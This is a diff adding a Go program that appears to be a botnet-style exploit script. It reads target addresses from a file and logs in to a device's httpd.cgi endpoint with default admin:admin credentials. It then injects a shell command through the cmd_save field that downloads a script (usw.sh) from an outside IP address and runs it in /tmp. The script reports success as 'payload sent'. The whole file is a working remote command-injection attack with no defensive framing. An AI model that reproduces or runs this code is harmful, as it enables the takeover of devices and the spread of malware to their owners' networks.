@@ -1,0 +1,58 @@
+/*
+
+"WWW-Authenticate: Basic realm=Web Server Authentication"
+
+*/
+
+package main
+
+import (
+    "fmt"
+    "net/http"
+    "io/ioutil"
+    "strings"
+)
+
+func main() {
+
+    ipPort, err := ioutil.ReadFile("ips.txt")
+    if err != nil {
+        fmt.Println("Error reading ips.txt:", err)
+        return
+    }
+
+    url := "http://" + string(ipPort) + "/cgi-bin/httpd.cgi"
+
+    payload := "src_file=result&cmd_save=func%20get%20ping%20%60cd%20%2Ftmp%3Bwget%20http%3A%2F%2F95.214.27.10%2Fusw.sh%3B%20sh%20usw.sh%60%3B&_=0.0038560533468083857"
+    req, err := http.NewRequest("POST", url, strings.NewReader(payload))
+    if err != nil {
+        fmt.Println("Error creating request:", err)
+        return
+    }
+
+    req.Header.Add("Host", string(ipPort)) 
+    req.Header.Add("Content-Length", fmt.Sprintf("%d", len(payload))) 
+    req.Header.Add("Authorization", "Basic YWRtaW46YWRtaW4=")
+    req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36")
+    req.Header.Add("Content-Type", "text/plain;charset=UTF-8")
+    req.Header.Add("Accept", "*/*")
+    req.Header.Add("Origin", "http://"+string(ipPort))
+    req.Header.Add("Referer", "http://"+string(ipPort)+"/ping_en.html")
+    req.Header.Add("Accept-Encoding", "gzip, deflate, br")
+    req.Header.Add("Accept-Language", "en-US,en;q=0.9")
+    req.Header.Add("Connection", "close")
+
+    client := &http.Client{}
+    resp, err := client.Do(req)
+    if err != nil {
+        fmt.Println("Error sending request:", err)
+        return
+    }
+    defer resp.Body.Close()
+
+    if resp.Status == "200 OK" {
+          fmt.Println("[usr-WEB] successfully sent payload to:", string(ipPort))
+    } else {
+       // fmt.Println("Request failed. Status:", resp.Status)
+    }
+}
